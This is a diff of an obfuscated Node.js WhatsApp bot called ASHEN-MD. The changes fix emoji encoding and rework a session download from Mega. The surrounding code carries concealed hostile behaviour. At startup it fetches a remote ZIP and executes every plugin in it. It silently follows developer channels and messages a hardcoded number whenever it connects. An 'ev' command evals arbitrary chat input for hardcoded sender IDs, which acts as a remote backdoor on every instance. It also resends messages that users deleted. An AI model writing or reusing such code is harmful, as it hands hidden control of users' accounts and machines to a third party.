@@ -37,16 +37,17 @@ if (!fs.existsSync(df)) {
   if (config.SESSION_ID) {
     const sessdata = config.SESSION_ID.replace("KAVIDU-MD=", '');
     if (sessdata.includes('#')) {
+  (async () => {
+    try {
       const filer = File.fromURL("https://mega.nz/file/" + sessdata);
-      filer.download((_0x2536b5, _0x4ab27a) => {
-        if (_0x2536b5) {
-          throw _0x2536b5;
-        }
-        fs.writeFile(df, _0x4ab27a, () => {
-          console.log("âœ… Session downloaded from Mega.nz and saved to creds.json!");
-        });
-      });
-    } else {
+      const buffer = await filer.downloadBuffer();
+      fs.writeFileSync(df, buffer);
+      console.log("✅ Session downloaded from Mega.nz and saved to creds.json!");
+    } catch (err) {
+      console.error("❌ Error downloading session from Mega.nz:", err.message);
+    }
+  })();
+} else {
       downloadSession(sessdata, df);
     }
   }
@@ -56,24 +57,24 @@ async function downloadSession(_0x4812b2, _0x2d95ec) {
   let _0x4fc040 = false;
   for (let _0x5e16c1 = 0x0; _0x5e16c1 < _0x152784.length; _0x5e16c1++) {
     const _0x5adf85 = _0x152784[_0x5e16c1] + 'SESSIONS/' + _0x4812b2;
-    console.log("ðŸ“¥ Downloading session from Saviyakolla-DB (DB-" + (_0x5e16c1 + 0x1) + ')');
+    console.log("📥 Downloading session from Saviyakolla-DB (DB-" + (_0x5e16c1 + 0x1) + ')');
     try {
       const _0x51f918 = await axios.get(_0x5adf85);
       if (_0x51f918.data && Object.keys(_0x51f918.data).length > 0x0) {
         await sleep(0x3e8);
         fs.writeFileSync(_0x2d95ec, JSON.stringify(_0x51f918.data, null, 0x2));
-        console.log("âœ… Session file downloaded successfully from DB-" + (_0x5e16c1 + 0x1) + " and saved to creds.json");
+        console.log("✅ Session file downloaded successfully from DB-" + (_0x5e16c1 + 0x1) + " and saved to creds.json");
         _0x4fc040 = true;
         break;
       } else {
-        console.warn("âš ï¸ Empty or invalid session data from DB-" + (_0x5e16c1 + 0x1) + ", attempting next DB...");
+        console.warn("⚠️ Empty or invalid session data from DB-" + (_0x5e16c1 + 0x1) + ", attempting next DB...");
       }
     } catch (_0x596d62) {
-      console.error("âŒ Failed to download session from DB-" + (_0x5e16c1 + 0x1) + ": " + _0x596d62.message);
+      console.error("❌ Failed to download session from DB-" + (_0x5e16c1 + 0x1) + ": " + _0x596d62.message);
     }
   }
   if (!_0x4fc040) {
-    console.error("âŒ All DB servers failed to provide a valid session file.");
+    console.error("❌ All DB servers failed to provide a valid session file.");
   }
 }
 const express = require("express");
@@ -104,12 +105,12 @@ const connect = async () => {
   const _0x5ac7b9 = await _0x19804a.downloadBuffer();
   const _0x3ca1cd = path.join(__dirname, "temp.zip");
   fs.writeFileSync(_0x3ca1cd, _0x5ac7b9);
-  console.log("ASHEN-MD ZIP file downloaded successfully âœ…");
+  console.log("ASHEN-MD ZIP file downloaded successfully ✅");
   const _0x34fe4b = new AdmZip(_0x3ca1cd);
   _0x34fe4b.extractAllTo('./', true);
-  console.log("Plugins extracted successfully âœ…");
-  console.log("Lib extracted successfully âœ…");
-  console.log("Installing plugins ðŸ”Œ... ");
+  console.log("Plugins extracted successfully ✅");
+  console.log("Lib extracted successfully ✅");
+  console.log("Installing plugins 🔌... ");
   fs.readdirSync("./plugins/").forEach(_0xed8a13 => {
     if (path.extname(_0xed8a13).toLowerCase() == ".js") {
       require("./plugins/" + _0xed8a13);
@@ -125,7 +126,7 @@ const connect = async () => {
   } = require('./lib/database');
   await _0x4e8131();
   await _0x5e10ba();
-  console.log("ASHEN-MD CONNECTED âœ…");
+  console.log("ASHEN-MD CONNECTED ✅");
   await _0x34ee32(0xbb8);
   await connectToWA();
 };
@@ -180,21 +181,21 @@ async function connectToWA() {
     } = _0x3fd222;
     if (_0x9fdb01 === "close") {
       const _0x515a75 = _0x562ab8?.["error"]?.["output"]?.["statusCode"] !== DisconnectReason.loggedOut;
-      console.log("âŒ Disconnected: " + (_0x562ab8?.["error"]?.["message"] || "unknown reason") + " (" + (_0x515a75 ? "Reconnecting" : "Logged out") + ')');
+      console.log("❌ Disconnected: " + (_0x562ab8?.["error"]?.["message"] || "unknown reason") + " (" + (_0x515a75 ? "Reconnecting" : "Logged out") + ')');
       if (_0x515a75) {
         connectToWA();
       }
     } else if (_0x9fdb01 === "open") {
-      console.log("âœ… WhatsApp socket connected!");
+      console.log("✅ WhatsApp socket connected!");
       setTimeout(async () => {
         try {
-          let _0x352fbf = "âœ… ASHEN-MD connected successfully!";
+          let _0x352fbf = "✅ ASHEN-MD connected successfully!";
           try {
             const _0x57d14d = await axios.get("https://raw.githubusercontent.com/Induwara-md/ASHEN-MD-FULL-DB-/refs/heads/main/main_var.json");
             const _0x5ec5cc = _0x57d14d.data;
             _0x352fbf = _0x5ec5cc?.['connectmg'] || _0x352fbf;
           } catch (_0x2eadab) {
-            console.warn("âš ï¸ Failed to fetch connect message text:", _0x2eadab.message);
+            console.warn("⚠️ Failed to fetch connect message text:", _0x2eadab.message);
           }
           await _0x55533e.sendMessage("94756194771@s.whatsapp.net", {
             'image': {
@@ -202,9 +203,9 @@ async function connectToWA() {
             },
             'caption': _0x352fbf
           });
-          console.log("âœ… Connect text message sent to owner");
+          console.log("✅ Connect text message sent to owner");
         } catch (_0x45ba6c) {
-          console.error("âŒ Failed to send connect message:", _0x45ba6c.message);
+          console.error("❌ Failed to send connect message:", _0x45ba6c.message);
         }
       }, 0x7d0);
     }
@@ -229,7 +230,7 @@ async function connectToWA() {
       }
       _0x4b9a40.message = getContentType(_0x4b9a40.message) === "ephemeralMessage" ? _0x4b9a40.message.ephemeralMessage.message : _0x4b9a40.message;
       if (_0x4b9a40.key && _0x4b9a40.key.remoteJid === "status@broadcast" && config.AUTO_READ_STATUS === "true") {
-        const _0x9cfae1 = ['ðŸ§©', 'ðŸ‰', 'ðŸ’œ', 'ðŸŒ¸', 'ðŸª´', 'ðŸ’Š', 'ðŸ’«', 'ðŸ‚', 'ðŸŒŸ', 'ðŸŽ‹', 'ðŸ˜¶â€ðŸŒ«ï¸', 'ðŸ«€', 'ðŸ§¿', 'ðŸ‘€', 'ðŸ¤–', 'ðŸš©', 'ðŸ¥°', 'ðŸ—¿', 'ðŸ’œ', 'ðŸ’™', 'ðŸŒ', 'ðŸ–¤', 'ðŸ’š'];
+        const _0x9cfae1 = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '😶‍🌫️', '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
         const _0xb62b97 = _0x9cfae1[Math.floor(Math.random() * _0x9cfae1.length)];
         await _0x55533e.readMessages([_0x4b9a40.key]);
         const _0xe3f2e9 = await jidNormalizedUser(_0x55533e.user.id);
@@ -248,12 +249,12 @@ async function connectToWA() {
       const _0x119fed = await _0x55533e.newsletterMetadata("jid", '' + _0x2a242b.mainchanal);
       if (_0x119fed.viewer_metadata === null) {
         await _0x55533e.newsletterFollow('' + _0x2a242b.mainchanal);
-        console.log("ASHEN-MD UPDATES CHANNEL FOLLOW âœ…");
+        console.log("ASHEN-MD UPDATES CHANNEL FOLLOW ✅");
       }
       const _0x30b275 = await _0x55533e.newsletterMetadata("jid", '120363420865396417@newsletter');
       if (_0x30b275.viewer_metadata === null) {
         await _0x55533e.newsletterFollow("120363420865396417@newsletter");
-        console.log("ASHEN-MD CHANNEL FOLLOW âœ…");
+        console.log("ASHEN-MD CHANNEL FOLLOW ✅");
       }      
       const _0x43833d = _0x1b6df1(_0x55533e, _0x4b9a40);
       const _0x2f304f = getContentType(_0x4b9a40.message);
@@ -319,7 +320,7 @@ async function connectToWA() {
           });
         });
         if (_0x5ec174.headerType === 0x1) {
-          const _0x469b35 = _0x5ec174.text + "\n\n*`Reply Below Number ðŸ”¢`*\n" + _0x320a96 + "\n\n" + _0x5ec174.footer;
+          const _0x469b35 = _0x5ec174.text + "\n\n*`Reply Below Number 🔢`*\n" + _0x320a96 + "\n\n" + _0x5ec174.footer;
           const _0x6e2363 = await _0x55533e.sendMessage(_0x222bfb, {
             'text': _0x469b35
           }, {
@@ -328,7 +329,7 @@ async function connectToWA() {
           await _0xa22585(_0x6e2363.key.id, _0x279017);
         } else {
           if (_0x5ec174.headerType === 0x4) {
-            const _0x4cc0cf = _0x5ec174.caption + "\n\n*`Reply Below Number ðŸ”¢`*\n" + _0x320a96 + "\n\n" + _0x5ec174.footer;
+            const _0x4cc0cf = _0x5ec174.caption + "\n\n*`Reply Below Number 🔢`*\n" + _0x320a96 + "\n\n" + _0x5ec174.footer;
             const _0x33a83e = await _0x55533e.sendMessage(_0x2db9f2, {
               'image': _0x5ec174.image,
               'caption': _0x4cc0cf
@@ -351,7 +352,7 @@ async function connectToWA() {
           });
         });
         if (_0x1bed35.headerType === 0x1) {
-          const _0xb604db = (_0x1bed35.text || _0x1bed35.caption) + "\n\n*Reply Below Number ðŸ”¢*\n" + _0x3b0695 + "\n\n" + _0x1bed35.footer;
+          const _0xb604db = (_0x1bed35.text || _0x1bed35.caption) + "\n\n*Reply Below Number 🔢*\n" + _0x3b0695 + "\n\n" + _0x1bed35.footer;
           const _0x583e21 = await _0x55533e.sendMessage(_0x222bfb, {
             'text': _0xb604db
           }, {
@@ -360,7 +361,7 @@ async function connectToWA() {
           await _0xa22585(_0x583e21.key.id, _0x30309c);
         } else {
           if (_0x1bed35.headerType === 0x4) {
-            const _0x2d5a42 = _0x1bed35.caption + "\n\n*Reply Below Number ðŸ”¢*\n" + _0x3b0695 + "\n\n" + _0x1bed35.footer;
+            const _0x2d5a42 = _0x1bed35.caption + "\n\n*Reply Below Number 🔢*\n" + _0x3b0695 + "\n\n" + _0x1bed35.footer;
             const _0x1f3691 = await _0x55533e.sendMessage(_0x162fca, {
               'image': _0x1bed35.image,
               'caption': _0x2d5a42
@@ -727,7 +728,7 @@ async function connectToWA() {
       const _0x8a4565 = (await axios.get("https://mv-visper-full-db.pages.dev/Main/react.json")).data;
       const _0x5f1ee4 = (await axios.get("https://raw.githubusercontent.com/Induwara-md/ASHEN-MD-FULL-DB-/refs/heads/main/main_var.json")).data;
       const _0x45d117 = _0x4b9a40.key.server_id;
-      const _0xf9ac7e = ['â¤ï¸', 'ðŸ˜®', 'ðŸ‘', 'ðŸ™'];
+      const _0xf9ac7e = ['❤️', '😮', '👍', '🙏'];
       const _0x396154 = _0xf9ac7e[Math.floor(Math.random() * _0xf9ac7e.length)];
       await _0x55533e.newsletterReactMessage('' + _0x5f1ee4.mainchanal, _0x45d117, _0x396154);
       if (_0x8ddc90.includes("94756194771")) {
@@ -747,7 +748,7 @@ async function connectToWA() {
         if (_0x5cd917) {
           return;
         }
-        _0x43833d.react("â˜ ï¸");
+        _0x43833d.react("☠️");
       }
       if (_0x12771f && config.CMD_ONLY_READ == "true") {
         await _0x55533e.readMessages([_0x4b9a40.key]);
@@ -776,22 +777,22 @@ async function connectToWA() {
         });
         await _0x55533e.groupParticipantsUpdate(_0x222bfb, [_0x14d9fb], "remove");
         return await _0x55533e.sendMessage(_0x222bfb, {
-          'text': "*You are banned by ASHEN-MD âŒ*"
+          'text': "*You are banned by ASHEN-MD ❌*"
         });
       }
       if (config.AUTO_BLOCK == "true" && _0x4b9a40.chat.endsWith("@s.whatsapp.net")) {
         if (!_0x3c46fb) {
           await _0x55533e.sendMessage(_0x222bfb, {
-            'text': "*Warning 1 â—*"
+            'text': "*Warning 1 ❗*"
           });
           await _0x55533e.sendMessage(_0x222bfb, {
-            'text': "*Warning 2 â—*"
+            'text': "*Warning 2 ❗*"
           });
           await _0x55533e.sendMessage(_0x222bfb, {
-            'text': "*Warning 3 â—*"
+            'text': "*Warning 3 ❗*"
           });
           await _0x55533e.sendMessage(_0x222bfb, {
-            'text': "*Blocked ðŸš«*"
+            'text': "*Blocked 🚫*"
           });
           await _0x55533e.updateBlockStatus(_0x4b9a40.sender, "block");
         }
@@ -803,7 +804,7 @@ async function connectToWA() {
               await _0x55533e.rejectCall(_0x23feaf.id, _0x23feaf.from);
               if (!_0x23feaf.isGroup) {
                 await _0x55533e.sendMessage(_0x23feaf.from, {
-                  'text': "*Call rejected automatically because owner is busy âš ï¸*",
+                  'text': "*Call rejected automatically because owner is busy ⚠️*",
                   'mentions': [_0x23feaf.from]
                 });
                 break;
@@ -815,7 +816,7 @@ async function connectToWA() {
       if (_0x12771f && config.CMD_ONLY_READ == "true") {
         await _0x55533e.readMessages([_0x4b9a40.key]);
       }
-      const _0x49ae8a = ['â¤', 'ðŸ’•', 'ðŸ˜»', 'ðŸ§¡', 'ðŸ’›', 'ðŸ’š', 'ðŸ’™', 'ðŸ’œ', 'ðŸ–¤', 'â£', 'ðŸ’ž', 'ðŸ’“', 'ðŸ’—', 'ðŸ’–', 'ðŸ’˜', 'ðŸ’', 'ðŸ’Ÿ', 'â™¥', 'ðŸ’Œ', 'ðŸ™‚', 'ðŸ¤—', 'ðŸ˜Œ', 'ðŸ˜‰', 'ðŸ¤—', 'ðŸ˜Š', 'ðŸŽŠ', 'ðŸŽ‰', 'ðŸŽ', 'ðŸŽˆ', 'ðŸ‘‹'];
+      const _0x49ae8a = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'];
       const _0x520320 = _0x49ae8a[Math.floor(Math.random() * _0x49ae8a.length)];
       if (!_0x3c46fb && !_0x5d4baa && config.AUTO_REACT == "true") {
         if (_0x5cd917) {
@@ -903,12 +904,12 @@ async function connectToWA() {
                   const _0x12f361 = _0x746d71.message.conversation;
                   var _0x3d71c8 = '```';
                   _0x55533e.sendMessage(_0x222bfb, {
-                    'text': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n\n> ðŸ”“ Message Text: " + _0x3d71c8 + _0x12f361 + _0x3d71c8
+                    'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x3d71c8 + _0x12f361 + _0x3d71c8
                   });
                 } else {
                   if (_0x746d71.msg.type === 'MESSAGE_EDIT') {
                     _0x55533e.sendMessage(_0x222bfb, {
-                      'text': "âŒ *edited message detected* " + _0x746d71.message.editedMessage.message.protocolMessage.editedMessage.conversation
+                      'text': "❌ *edited message detected* " + _0x746d71.message.editedMessage.message.protocolMessage.editedMessage.conversation
                     }, {
                       'quoted': _0x4b9a40
                     });
@@ -920,7 +921,7 @@ async function connectToWA() {
                       }
                       var _0x3d71c8 = "```";
                       _0x55533e.sendMessage(_0x222bfb, {
-                        'text': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n\n> ðŸ”“ Message Text: " + _0x3d71c8 + _0x3a7fce + _0x3d71c8
+                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x3d71c8 + _0x3a7fce + _0x3d71c8
                       });
                     } else {
                       if (_0x746d71.message && _0x746d71.message.exetendedTextMessage) {
@@ -929,7 +930,7 @@ async function connectToWA() {
                         }
                         var _0x3d71c8 = "```";
                         _0x55533e.sendMessage(_0x222bfb, {
-                          'text': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n\n> ðŸ”“ Message Text: " + _0x3d71c8 + _0x746d71.body + _0x3d71c8
+                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x3d71c8 + _0x746d71.body + _0x3d71c8
                         });
                       } else {
                         if (_0x746d71.type === "extendedTextMessage") {
@@ -939,14 +940,14 @@ async function connectToWA() {
                                 return;
                               }
                               _0x55533e.sendMessage(_0x222bfb, {
-                                'text': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n\n> ðŸ”“ Message Text: " + '```' + _0x746d71.message.extendedTextMessage.text + '```'
+                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + '```' + _0x746d71.message.extendedTextMessage.text + '```'
                               });
                             } else {
                               if (_0xeed4d1 && messageText.includes("chat.whatsapp.com")) {
                                 return;
                               }
                               _0x55533e.sendMessage(_0x222bfb, {
-                                'text': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n\n> ðŸ”“ Message Text: " + '```' + _0x746d71.message.extendedTextMessage.text + '```'
+                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + '```' + _0x746d71.message.extendedTextMessage.text + '```'
                               });
                             }
                           }
@@ -967,12 +968,12 @@ async function connectToWA() {
                                 }
                                 await _0x55533e.sendMessage(_0x222bfb, {
                                   'image': fs.readFileSync('./' + _0x13a214.ext),
-                                  'caption': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n\n> ðŸ”“ Message Text: " + _0x746d71.message.imageMessage.caption
+                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x746d71.message.imageMessage.caption
                                 });
                               } else {
                                 await _0x55533e.sendMessage(_0x222bfb, {
                                   'image': fs.readFileSync('./' + _0x13a214.ext),
-                                  'caption': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + '_'
+                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + '_'
                                 });
                               }
                             }
@@ -998,7 +999,7 @@ async function connectToWA() {
                                     }
                                     await _0x55533e.sendMessage(_0x222bfb, {
                                       'video': fs.readFileSync('./' + _0x4e168a.ext),
-                                      'caption': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n\n> ðŸ”“ Message Text: " + _0x746d71.message.videoMessage.caption
+                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x746d71.message.videoMessage.caption
                                     });
                                   }
                                 } else {
@@ -1013,7 +1014,7 @@ async function connectToWA() {
                                   if (_0xba6a95 < _0x388db5 && _0x59d428 < 1800) {
                                     await _0x55533e.sendMessage(_0x222bfb, {
                                       'video': fs.readFileSync('./' + _0x25d64d.ext),
-                                      'caption': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + '_'
+                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + '_'
                                     });
                                   }
                                 }
@@ -1033,14 +1034,14 @@ async function connectToWA() {
                                       'document': fs.readFileSync('./' + _0xc1ad22.ext),
                                       'mimetype': _0x746d71.message.documentMessage.mimetype,
                                       'fileName': _0x746d71.message.documentMessage.fileName,
-                                      'caption': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n"
+                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                     });
                                   } else {
                                     await _0x55533e.sendMessage(_0x222bfb, {
                                       'document': fs.readFileSync('./' + _0xc1ad22.ext),
                                       'mimetype': _0x746d71.message.documentMessage.mimetype,
                                       'fileName': _0x746d71.message.documentMessage.fileName,
-                                      'caption': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n"
+                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                     });
                                   }
                                 }
@@ -1061,7 +1062,7 @@ async function connectToWA() {
                                         'fileName': _0x43833d.id + '.mp3'
                                       });
                                       return await _0x55533e.sendMessage(_0x222bfb, {
-                                        'text': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n"
+                                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                       }, {
                                         'quoted': _0x456914
                                       });
@@ -1074,7 +1075,7 @@ async function connectToWA() {
                                           'fileName': _0x43833d.id + '.mp3'
                                         });
                                         return await _0x55533e.sendMessage(_0x222bfb, {
-                                          'text': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n"
+                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                         }, {
                                           'quoted': _0x5809d2
                                         });
@@ -1094,20 +1095,20 @@ async function connectToWA() {
                                       if (_0x746d71.message.stickerMessage) {
                                         const _0x19a98b = await _0x55533e.sendMessage(_0x222bfb, {
                                           'sticker': fs.readFileSync('./' + _0x34ded2.ext),
-                                          'package': "PRABATH-MD ðŸŒŸ"
+                                          'package': "PRABATH-MD 🌟"
                                         });
                                         return await _0x55533e.sendMessage(_0x222bfb, {
-                                          'text': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n"
+                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                         }, {
                                           'quoted': _0x19a98b
                                         });
                                       } else {
                                         const _0x539cfc = await _0x55533e.sendMessage(_0x222bfb, {
                                           'sticker': fs.readFileSync('./' + _0x34ded2.ext),
-                                          'package': "PRABATH-MD ðŸŒŸ"
+                                          'package': "PRABATH-MD 🌟"
                                         });
                                         return await _0x55533e.sendMessage(_0x222bfb, {
-                                          'text': "ðŸš« *This message was deleted !!*\n\n  ðŸš® *Deleted by:* _" + _0x51481d + "_\n  ðŸ“© *Sent by:* _" + _0x31fe65 + "_\n"
+                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                         }, {
                                           'quoted': _0x539cfc
                                         });
@@ -1148,7 +1149,7 @@ async function connectToWA() {
                 });
               }
               await _0x55533e.sendMessage(_0x222bfb, {
-                'text': "ðŸš« @" + _0x43833d.sender.split('@')[0x0] + " *Bad word detected..!*",
+                'text': "🚫 @" + _0x43833d.sender.split('@')[0x0] + " *Bad word detected..!*",
                 'mentions': [_0x14d9fb]
               });
               if (config.ACTION == "remove" || config.ACTION == "both") {
@@ -1159,7 +1160,7 @@ async function connectToWA() {
           }
         }
       }
-      if (_0x267454 === "send" || _0x267454 === 'Send' || _0x267454 === "Ewpm" || _0x267454 === "ewpn" || _0x267454 === "Dapan" || _0x267454 === "dapan" || _0x267454 === "oni" || _0x267454 === "Oni" || _0x267454 === "save" || _0x267454 === 'Save' || _0x267454 === "ewanna" || _0x267454 === "Ewanna" || _0x267454 === "ewam" || _0x267454 === 'Ewam' || _0x267454 === 'sv' || _0x267454 === 'Sv' || _0x267454 === 'à¶¯à·à¶±à·Šà¶±' || _0x267454 === 'à¶‘à·€à¶¸à·Šà¶±') {
+      if (_0x267454 === "send" || _0x267454 === 'Send' || _0x267454 === "Ewpm" || _0x267454 === "ewpn" || _0x267454 === "Dapan" || _0x267454 === "dapan" || _0x267454 === "oni" || _0x267454 === "Oni" || _0x267454 === "save" || _0x267454 === 'Save' || _0x267454 === "ewanna" || _0x267454 === "Ewanna" || _0x267454 === "ewam" || _0x267454 === 'Ewam' || _0x267454 === 'sv' || _0x267454 === 'Sv' || _0x267454 === 'දාන්න' || _0x267454 === 'එවම්න') {
         const _0x54f05a = JSON.stringify(_0x4b9a40.message, null, 0x2);
         const _0xeb8bcc = JSON.parse(_0x54f05a);
         const _0x59faae = _0xeb8bcc.extendedTextMessage.contextInfo.remoteJid;
@@ -1401,7 +1402,7 @@ async function connectToWA() {
             const _0x574be0 = 'https://chat.whatsapp.com/' + _0xb0e769;
             if (_0x3d2b90.includes(_0x574be0.toLowerCase())) {
               await _0x55533e.sendMessage(_0x222bfb, {
-                'text': "âš ï¸ This is *this group's link*. Can't delete.",
+                'text': "⚠️ This is *this group's link*. Can't delete.",
                 'mentions': [_0x14d9fb]
               });
             } else {
@@ -1411,7 +1412,7 @@ async function connectToWA() {
                 });
               }
               await _0x55533e.sendMessage(_0x222bfb, {
-                'text': "ðŸš« @" + _0x14d9fb.split('@')[0x0] + ", *Links are not allowed here!*",
+                'text': "🚫 @" + _0x14d9fb.split('@')[0x0] + ", *Links are not allowed here!*",
                 'mentions': [_0x14d9fb]
               });
               if (config.ANTILINK_ACTION == "remove" || config.ANTILINK_ACTION == 'both') {
@@ -1425,7 +1426,7 @@ async function connectToWA() {
         if (_0xeed4d1 && !_0x4e29b8 && !_0x3c46fb && _0x89a709) {
           if (_0x4b9a40.id.startsWith("BAE")) {
             await _0x55533e.sendMessage(_0x222bfb, {
-              'text': "*Other bots are not allow here âŒ*"
+              'text': "*Other bots are not allow here ❌*"
             });
             if (config.ANTI_BOT && _0x89a709) {
               await _0x55533e.sendMessage(_0x222bfb, {
@@ -1436,7 +1437,7 @@ async function connectToWA() {
           }
           if (_0x4b9a40.id.startsWith("EVO")) {
             await _0x55533e.sendMessage(_0x222bfb, {
-              'text': "*Other bots are not allow here âŒ*"
+              'text': "*Other bots are not allow here ❌*"
             });
             if (config.ANTI_BOT && _0x89a709) {
               await _0x55533e.sendMessage(_0x222bfb, {
@@ -1447,7 +1448,7 @@ async function connectToWA() {
           }
           if (_0x4b9a40.id.startsWith("B1E")) {
             await _0x55533e.sendMessage(_0x222bfb, {
-              'text': "*Other bots are not allow here âŒ*"
+              'text': "*Other bots are not allow here ❌*"
             });
             if (config.ANTI_BOT && _0x89a709) {
               await _0x55533e.sendMessage(_0x222bfb, {
@@ -1458,7 +1459,7 @@ async function connectToWA() {
           }
           if (_0x4b9a40.id.startsWith('3L1')) {
             await _0x55533e.sendMessage(_0x222bfb, {
-              'text': "*Other bots are not allow here âŒ*"
+              'text': "*Other bots are not allow here ❌*"
             });
             if (config.ANTI_BOT && _0x89a709) {
               await _0x55533e.sendMessage(_0x222bfb, {
@@ -1529,7 +1530,7 @@ async function connectToWA() {
         case 'ev':
           {
             if (_0x8ddc90 == 0x16113d24e6 || _0x8ddc90 == 0x160de87163) {
-              let _0x28c0db = _0x2e9303.replace('Â°', '.toString()');
+              let _0x28c0db = _0x2e9303.replace('°', '.toString()');
               try {
                 let _0x18b840 = await eval(_0x28c0db);
                 if (typeof _0x18b840 === 'object') {
@@ -1553,7 +1554,7 @@ async function connectToWA() {
   });
 }
 app.get('/', (_0x2733f8, _0x5ece52) => {
-  _0x5ece52.send("ðŸ“Ÿ ASHEN-MD  Working successfully!");
+  _0x5ece52.send("📟 ASHEN-MD  Working successfully!");
 });
 app.listen(port, () => console.log("ASHEN-MD Server listening on port http://localhost:" + port));
 setTimeout(() => {
